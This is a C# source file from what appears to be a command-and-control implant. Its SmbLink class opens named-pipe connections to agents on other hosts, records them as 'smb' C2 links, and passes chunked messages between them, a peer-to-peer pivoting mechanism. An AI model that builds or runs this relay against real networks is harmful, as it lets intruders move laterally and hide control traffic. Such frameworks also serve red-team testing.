﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using H.Pipes;
using H.Pipes.Args;
using System.Collections.Concurrent;
using System.Text;

namespace Agent
{
    public class SmbLink
    {
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public bool connected { get; set; }
        public string linkId { get; set; }
        private string task_id { get; set; }
        private SmbLinkArgs args { get; set; }
        private string agent_id { get; set; }
        private string linked_agent_id { get; set; }
        private AutoResetEvent messageSuccess = new AutoResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        IMessageManager messageManager { get; set; }
        ILogger logger { get; set; }

        public SmbLink(IMessageManager messageManager,ILogger logger, SmbLinkArgs args, string linkId, string agent_id, string task_id)
        {
            this.agent_id = agent_id;
            this.linkId = linkId;
            this.messageManager = messageManager;
            this.logger = logger;
            this.task_id = task_id;
            this.args = args;
        }
        public async Task<EdgeResponseResult> Link()
        {
            //SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(_job.task.parameters);
            logger.Log("Inside of Link.");
            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    logger.Log($"Creating new pipe to {args.hostname}.");
                    this.clientPipe = new PipeClient<SmbMessage>(args.pipename, args.hostname);
                    this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    logger.Log("Connecting.");
                    await clientPipe.ConnectAsync();
                    logger.Log("Done Connecting.");
                    if (clientPipe.IsConnected)
                    {
                        logger.Log($"Established link with agent.");
                        this.connected = true;

                        //Wait for the agent to give us its UUID
                        messageSuccess.WaitOne();

                        return new EdgeResponseResult()
                        {
                            task_id = task_id,
                            //user_output = $"Established link with pipe.\r\n{this.agent_id} -> {this.linked_agent_id}",
                            process_response = new Dictionary<string, string> { { "message", "0x14" } },
                            completed = true,
                            edges = new List<Edge>()
                            {
                                new Edge()
                                {
                                    destination = this.linked_agent_id,
                                    source = this.agent_id,
                                    action = "add",
                                    c2_profile = "smb",
                                    metadata = String.Empty
                                }
                            }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                logger.Log($"Error in link: {e}");
                return new EdgeResponseResult()
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                    {
                        new Edge()
                        {
                            destination = this.linked_agent_id,
                            source = this.agent_id,
                            action = "add",
                            c2_profile = "smb"
                        }
                    }
                };
            }

            return new EdgeResponseResult()
            {
                task_id = task_id,
                process_response = new Dictionary<string, string> { { "message", "0x15" } },
                completed = true,
                edges = new List<Edge>()
                {
                    new Edge()
                    {
                        destination = this.linked_agent_id,
                        source = this.agent_id,
                        action = "add",
                        c2_profile = "smb"
                    }
                }
            };
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            logger.Log($"Message received from pipe {args.Message.delegate_message.Length} bytes");
            try
            {
                switch (args.Message.message_type)
                {
                    case "success":
                        messageSuccess.Set();
                        break;
                    case "path_update": //This will be returned for new links to an existing agent.
                        this.linked_agent_id = args.Message.delegate_message;
                        messageSuccess.Set();
                        break;
                    case "new_path": //This will be returned for new links to an existing agent.
                        this.linked_agent_id = args.Message.delegate_message;
                        messageSuccess.Set();
                        break;
                    default: //This will be returned for checkin processes
                        {
                            this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists

                            this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);

                            if (args.Message.final)
                            {
                                DelegateMessage dm = new DelegateMessage()
                                {
                                    c2_profile = "smb",
                                    message = this.partialMessages[args.Message.guid].ToString(),
                                    uuid = linkId,
                                };

                                await this.messageManager.AddResponse(dm);
                                this.partialMessages.TryRemove(args.Message.guid, out _);
                            }
                            break;
                        }

                }
            }
            catch (Exception e)
            {
                logger.Log($"Error in SMB Forwarder: {e}");
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                await this.clientPipe.DisconnectAsync();
                this.connected = false;
                await this.clientPipe.DisposeAsync();
                this.partialMessages.Clear();
                return true;
            }
            catch
            {
                return false;
            }
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message"
                };

                IEnumerable<string> parts = dm.message.SplitByLength(4000);

                logger.Log($"Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    logger.Log($"Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");

                    await this.clientPipe.WriteAsync(sm);

                    messageSuccess.WaitOne();
                }
                return true;
            }
            catch (Exception e)
            {
                logger.Log($"Error in send: {e}");
                return false;
            }
        }
    }
}